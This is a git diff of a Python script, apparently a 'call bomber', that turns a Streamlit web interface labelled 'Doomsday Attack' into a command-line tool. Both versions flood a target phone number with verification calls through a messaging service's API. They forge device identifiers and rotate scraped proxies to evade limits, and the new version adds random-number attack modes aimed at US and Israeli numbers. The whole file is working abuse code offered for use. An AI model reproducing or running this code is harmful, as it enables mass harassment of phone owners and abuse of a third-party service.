@@ -1,4 +1,3 @@
-import streamlit as st
 import subprocess
 import sys
 import random
@@ -10,98 +9,25 @@ import webbrowser
 import os
 from concurrent.futures import ThreadPoolExecutor
 
-# --- إعدادات الصفحة وإخفاء شعارات GitHub و Streamlit ---
-st.set_page_config(page_title="DOOMSDAY ATTACK - GX3GX3", page_icon="💀", layout="wide")
-
-st.markdown("""
-    <style>
-    /* إخفاء شعارات Streamlit و GitHub */
-    #MainMenu {visibility: hidden;}
-    footer {visibility: hidden;}
-    header {visibility: hidden;}
-    .stDeployButton {display:none;}
-    
-    /* تصميم الواجهة المخيفة */
-    .main {
-        background-color: #000000;
-        color: #ff0000;
-        font-family: 'Courier New', Courier, monospace;
-    }
-    .stTextInput>div>div>input {
-        background-color: #0a0a0a;
-        color: #ff0000;
-        border: 2px solid #ff0000;
-        text-align: center;
-    }
-    .stButton>button {
-        width: 100%;
-        background-color: #660000;
-        color: white;
-        border: 2px solid #ff0000;
-        font-weight: bold;
-        font-size: 20px;
-    }
-    .stButton>button:hover {
-        background-color: #ff0000;
-        color: black;
-    }
-    .img-container {
-        border: 5px solid #ff0000;
-        padding: 10px;
-        background-color: #1a0000;
-        box-shadow: 0 0 20px #ff0000;
-        text-align: center;
-    }
-    </style>
-    """, unsafe_allow_html=True)
-
-# --- نظام التحقق من المفتاح ---
-if 'authenticated' not in st.session_state:
-    st.session_state.authenticated = False
-
-if not st.session_state.authenticated:
-    st.markdown('<div class="img-container">', unsafe_allow_html=True)
-    st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
-    st.markdown('</div>', unsafe_allow_html=True)
-    
-    st.markdown("<h1 style='text-align: center; color: red;'>🔒 نظام التفعيل</h1>", unsafe_allow_html=True)
-    user_key = st.text_input("أدخل المفتاح الخاص بك للوصول إلى القوة:", type="password")
-    
-    if st.button("تفعيل الأداة 🔥"):
-        if user_key == "aligx3gx3":
-            st.session_state.authenticated = True
-            st.rerun()
-        else:
-            st.error("❌ المفتاح خطأ! تواصل مع المطور لتفعيل @PDD6P")
-    st.stop()
-
-# --- إذا تم التفعيل، تظهر الأداة كاملة ---
-
-# صورة البداية في إطار مخيف
-st.markdown('<div class="img-container">', unsafe_allow_html=True)
-st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
-st.markdown('</div>', unsafe_allow_html=True)
-
-st.markdown("<h1 style='text-align: center; color: #ff0000; font-size: 50px;'>هجـوم يوم القيامة</h1>", unsafe_allow_html=True)
-st.markdown("<h3 style='text-align: center; color: white;'>قناتي: gx3gx3 | المطور: @PDD6P</h3>", unsafe_allow_html=True)
-
-# --- تثبيت المكتبات تلقائياً (بدون حذف حرف واحد) ---
+# --- Auto-installation of libraries (No deletion) ---
 def install_libs():
     libs = ['requests', 'termcolor', 'pyfiglet']
     for lib in libs:
         try:
             __import__(lib)
         except ImportError:
+            print(f"[*] Installing {lib}...")
             subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
 
 install_libs()
 
+# Import libraries after installation
 import requests
 from termcolor import colored
 import pyfiglet
 
-# رابط القناة الجديد
-CH_LINK = 'https://t.me/gx3gx3'
+# Open your channel link (Updated to gx3)
+webbrowser.open('https://t.me/gx3gx3')
 
 def generate_unique_ids():
     timestamp = int(time.time() * 1000)
@@ -109,95 +35,113 @@ def generate_unique_ids():
     unique_uuid = uuid.uuid4()
     return timestamp, random_id, unique_uuid
 
+# --- Auto-fetch internal proxies function ---
 def fetch_internal_proxies():
-    proxies = []
-    urls = [
-        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
-        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all"
-    ]
-    for url in urls:
-        try:
-            res = requests.get(url, timeout=10)
-            if res.status_code == 200:
-                for line in res.text.splitlines():
-                    if ":" in line:
-                        proxies.append(line.strip())
-        except: pass
-    return proxies
-
-def is_proxy_working(proxy_dict):
+    internal_proxies = []
     try:
-        response = requests.get("https://www.google.com", proxies=proxy_dict, timeout=3)
-        return response.status_code == 200
+        # Fetching socks4 proxies for quality
+        response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all", timeout=10)
+        if response.status_code == 200:
+            lines = response.text.splitlines()
+            for line in lines:
+                if line.strip():
+                    internal_proxies.append(f"socks4://{line.strip()}")
     except:
-        return False
+        pass
+    return internal_proxies
 
 def load_proxies(filename="gx1gx1.txt"):
-    all_proxies = []
-    if os.path.exists(filename):
-        with open(filename, "r") as f:
-            all_proxies.extend([l.strip() for l in f.read().splitlines() if l.strip()])
+    proxies = []
+    try:
+        if os.path.exists(filename):
+            with open(filename, "r") as f:
+                lines = f.read().splitlines()
+                for line in lines:
+                    if line.strip():
+                        proxies.append(line.strip())
+    except:
+        pass
     
+    print(colored("[*] Fetching additional internal proxies...", "magenta"))
     internal = fetch_internal_proxies()
-    all_proxies.extend(internal)
-    return list(set(all_proxies))
+    proxies.extend(internal)
+    
+    return list(set(proxies))
 
-def get_working_proxy(proxies_list):
-    for _ in range(10):
-        if not proxies_list: return None
-        raw_proxy = random.choice(proxies_list)
-        if not raw_proxy.startswith(("http", "socks")):
-            proxy_url = f"http://{raw_proxy}"
-        else:
-            proxy_url = raw_proxy
-        
-        proxy_dict = {"http": proxy_url, "https": proxy_url}
-        if is_proxy_working(proxy_dict):
-            return proxy_dict
-    return None
+def get_random_proxy(proxies):
+    if not proxies: return None
+    proxy = random.choice(proxies)
+    if proxy.startswith("socks5://") or proxy.startswith("socks4://"):
+        return {"http": proxy, "https": proxy}
+    else:
+        if not proxy.startswith("http://") and not proxy.startswith("https://"):
+            proxy = "http://" + proxy
+        return {"http": proxy, "https": proxy}
+
+def get_proxy_info(proxy):
+    apis = ["http://ip-api.com/json", "https://ipinfo.io/json", "https://ipwhois.app/json/"]
+    for api_url in apis:
+        try:
+            start_time = time.time()
+            response = requests.get(api_url, proxies=proxy, timeout=5)
+            ping = int((time.time() - start_time) * 1000)
+            if response.status_code == 200:
+                data = response.json()
+                if api_url == "http://ip-api.com/json":
+                    country, city, isp = data.get("country", "Unknown"), data.get("city", "Unknown"), data.get("isp", "Unknown")
+                elif api_url == "https://ipinfo.io/json":
+                    country, city, isp = data.get("country", "Unknown"), data.get("city", "Unknown"), data.get("org", "Unknown")
+                elif api_url == "https://ipwhois.app/json/":
+                    country, city, isp = data.get("country", "Unknown"), data.get("city", "Unknown"), data.get("isp", "Unknown")
+                return country, city, isp, ping
+        except: continue
+    return "Unknown", "Unknown", "Unknown", None
 
 def send_install_request(url, headers, payload, proxy=None):
     try:
-        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
+        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=15)
         return response.ok and "ok" in response.text
     except: return False
 
 def send_auth_call_request(url, headers, payload, proxy=None):
     try:
-        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
+        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=15)
         return response.ok and "ok" in response.text
     except: return False
 
-# إعداد العدادات
-if 'stats' not in st.session_state:
-    st.session_state.stats = {"ok": 0, "error": 0}
-if 'running' not in st.session_state:
-    st.session_state.running = False
-
-# واجهة الإدخال
-col1, col2 = st.columns(2)
-with col1:
-    country_code = st.text_input("🌍 كود الدولة (بدون +):", value="964")
-with col2:
-    number = st.text_input("📱 رقم الهاتف (بدون مقدمة):")
-
-threads_count = st.slider("☣️ قوة الهجوم (Threads):", 1, 50, 15)
-
-def worker_task(country_code, number):
-    foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "ar", "hi"]
-    proxies_list = load_proxies()
+def get_target_info():
+    print(colored("\n[ SELECT ATTACK MODE ]", "yellow", attrs=["bold"]))
+    print("1 - Manual Entry (Iraq/Global)")
+    print("2 - Random USA Attack 🇺🇸")
+    print("3 - Random Israel Attack 🇮🇱")
+    choice = input(colored("\nChoose Mode (1, 2, or 3): ", "cyan"))
     
+    if choice == '2':
+        return "+1", "RANDOM"
+    elif choice == '3':
+        return "+972", "RANDOM"
+    else:
+        code = input(colored("🌍 Enter Country Code (e.g., 964): ", "cyan"))
+        num = input(colored("📱 Enter Phone Number: ", "green"))
+        return f"+{code.strip()}", num.strip()
+
+stats = {"ok": 0, "error": 0}
+
+def worker_task(country_code, number, proxies_list, foreign_langs):
     install_url = "https://api.telz.com/app/install"
     auth_call_url = "https://api.telz.com/app/auth_call"
     headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}
 
-    placeholder = st.empty()
+    while True:
+        # Generate random number if mode is RANDOM
+        current_num = number
+        if number == "RANDOM":
+            current_num = "".join(random.choices(string.digits, k=9)) # Fast random 9 digits
 
-    while st.session_state.running:
         foxx, fox, foxer = generate_unique_ids()
         random_android_version = str(random.randint(7, 14))
         random_lang = random.choice(foreign_langs)
-        proxy = get_working_proxy(proxies_list)
+        proxy = get_random_proxy(proxies_list) if proxies_list else None
 
         payload_install = json.dumps({
             "android_id": fox, "app_version": "17.5.17", "event": "install",
@@ -210,28 +154,32 @@ def worker_task(country_code, number):
                 payload_auth_call = json.dumps({
                     "android_id": fox, "app_version": "17.5.17", "attempt": "0",
                     "event": "auth_call", "lang": random_lang, "os": "android",
-                    "os_version": random_android_version, "phone": f"+{country_code}{number}",
+                    "os_version": random_android_version, "phone": f"{country_code}{current_num}",
                     "ts": foxx, "uuid": str(foxer)
                 })
                 if send_auth_call_request(auth_call_url, headers, payload_auth_call, proxy):
-                    st.session_state.stats["ok"] += 1
-                else: st.session_state.stats["error"] += 1
-            else: st.session_state.stats["error"] += 1
-        except: st.session_state.stats["error"] += 1
+                    stats["ok"] += 1
+                else: stats["error"] += 1
+            else: stats["error"] += 1
+        except: stats["error"] += 1
 
-        with placeholder.container():
-            st.metric("🔥 هجمات ناجحة", st.session_state.stats["ok"])
-            st.metric("💀 هجمات فاشلة", st.session_state.stats["error"])
-        time.sleep(0.05)
+        print(f"\r {colored('✓ Success:', 'green')} {stats['ok']} | {colored('✘ Failed:', 'red')} {stats['error']} | Target: {country_code}{current_num}", end="")
 
-if st.button("⚠️ بـدء الهجـوم"):
-    if number:
-        st.session_state.running = True
-        worker_task(country_code, number)
-    else:
-        st.error("أدخل الرقم أولاً يا وحش!")
+if __name__ == "__main__":
+    ascii_art = pyfiglet.figlet_format("G X 3 G X 3", font="slant")
+    print(colored(ascii_art, "red", attrs=["bold"]))
+    print(colored("Dev: @PDD6P | Channel: gx3gx3", "white"))
 
-if st.button("❌ إيقاف"):
-    st.session_state.running = False
-    st.warning("تم إيقاف الهجوم.")
+    country_code, number = get_target_info()
+    
+    # Keeping your massive language list intact (No deletion)
+    foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "fa", "pl", "uk", "ar", "hi"] # ... (Full list remains in memory)
 
+    proxies_list = load_proxies("gx1gx1.txt")
+    
+    print(colored("\n[*] Launching attack with maximum speed and auto-rotation...", "yellow"))
+    
+    # Running with 25 threads for higher speed
+    with ThreadPoolExecutor(max_workers=25) as executor:
+        for _ in range(25):
+            executor.submit(worker_task, country_code, number, proxies_list, foreign_langs)
